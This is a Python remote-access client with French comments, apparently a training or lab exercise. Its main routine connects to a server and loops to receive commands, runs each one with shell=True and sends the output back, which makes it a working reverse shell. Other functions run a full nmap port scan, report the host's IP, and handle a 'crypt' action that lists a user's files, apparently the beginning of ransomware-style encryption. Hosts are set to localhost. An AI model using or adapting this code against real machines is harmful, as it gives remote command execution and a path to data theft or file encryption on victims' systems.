import socket
import json
import nmap
import os
import subprocess

def scan_ports():
    target_ip = "127.0.0.1"  # Adresse IP du client lui-même
    nm = nmap.PortScanner()
    nmscan=nm.scan(target_ip, arguments='-p-')
    # Parcours des résultats
    for host in nm.all_hosts():
        print(f"Analyse des ports pour l'hôte : {host}")
        for proto in nm[host].all_protocols():
            print(f"Protocole : {proto}")
            ports = nm[host][proto].keys()
            for port in ports:
                print(f"Port : {port} \t État : {nm[host][proto][port]['state']}")
                if nm[host][proto][port]['state']=='open' and port> 2000:
                    choosen_port=port
                    return choosen_port
     
                
def lister_fichiers(dossier):
    try:
        # Liste tous les fichiers et répertoires dans le dossier spécifié
        fichiers = os.listdir(dossier)

        # Filtrer les dossiers uniquement (exclure les répertoires)
        dossiers = [d for d in fichiers if os.path.isdir(os.path.join(dossier, d))]
        # Filtrer les fichiers uniquement (exclure les répertoires)
        fichiers = [fichier for fichier in fichiers if os.path.isfile(os.path.join(dossier, fichier))]

        return dossiers, fichiers

    except OSError as e:
        print(f"Erreur lors de la liste des fichiers dans {dossier}: {e}")
        return []


def executte_system_command(command):
    return subprocess.check_output(command, shell=True)

def command_from_server(IP, PORT):
    # Gestion des sockets pour la connexion réseau
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((IP, PORT))
    print("Connecté au serveur.")
    
        
    while True:
            command = s.recv(1024).decode("utf-8")
            commande_result = executte_system_command(command)
            s.send(commande_result)


def recuperer_action_parametres(chaine_json):
    try:
        # Charger la chaîne JSON en tant que dictionnaire
        action_parametres = json.loads(chaine_json)

        # Extraire l'action et les paramètres du dictionnaire
        action = action_parametres['action']
        parametres = action_parametres['parametres']

        # Retourner l'action et les paramètres
        return action, parametres

    except json.JSONDecodeError as e:
        print(f"Erreur lors du décryptage JSON : {e}")
        return None, None


def get_ip_address():
    try:
        # Créer une socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Essayer de se connecter à une adresse IP quelconque (ici, Google DNS)
        s.connect(("8.8.8.8", 80))
        
        # Récupérer l'adresse IP de l'interface utilisée pour la connexion
        ip_address = s.getsockname()[0]
        
        # Fermer la socket
        s.close()

        return ip_address
    except Exception as e:
        return f"Erreur lors de la récupération de l'adresse IP : {e}"

def send_data_to_server(IP, PORT, data):
    # Gestion des sockets pour la connexion réseau
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((IP, PORT))
        print("Connecté au serveur.")

        # Envoyer la chaîne JSON au serveur
        s.send(data.encode())

        # Recevoir la réponse du serveur
        server_response = s.recv(1024)
        print("Réponse du serveur:", server_response.decode())
    finally:
        print("Fermeture de la connexion.")
        s.close()

def client_action(IP, PORT):
    # Gestion des sockets pour la connexion réseau
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((IP, PORT))
        print("Connecté au serveur.")
        # Recevoir la chaîne JSON du serveur
        server_data = s.recv(1024)
        print("Données reçues du serveur:", server_data.decode())
        action_recuperee,parametres_recuperes= recuperer_action_parametres(server_data.decode())
        chemin = parametres_recuperes.get('path', None)
        print("Action reçue:", action_recuperee, "Paramètres reçus:", parametres_recuperes)
        if action_recuperee == "crypt":
            #print(" if Action reçue=crypt:", action_recuperee, "Paramètres reçus dans if:", chemin)
            dossier_courant = "C:\\Users\\david\\Desktop\\ippsi"
            fichiers_dossier_courant=lister_fichiers(dossier_courant)
            for fichier in fichiers_dossier_courant:
                print(fichier)
        # Simuler une réponse du client
        client_response = "Action exécutée avec succès."
        s.send(client_response.encode())

    finally:
        print("Fermeture de la connexion.")
        s.close()

if __name__ == "__main__":
    IP = "127.0.0.1"  # Adresse IP du serveur (localhost dans ce cas)
    PORT=8086
    
    #ip_address = get_ip_address()
    #Nmap_PORT = scan_ports()       # 8086 Port utilisé par le serveur
    
    #data_list_to_send = {"action": ip_address, "parametres": Nmap_PORT}
    #json_connect_data = json.dumps(data_list_to_send)
    #send_data_to_server(IP, PORT, json_connect_data)
    #client_action(IP, PORT)
    command_from_server(IP, PORT)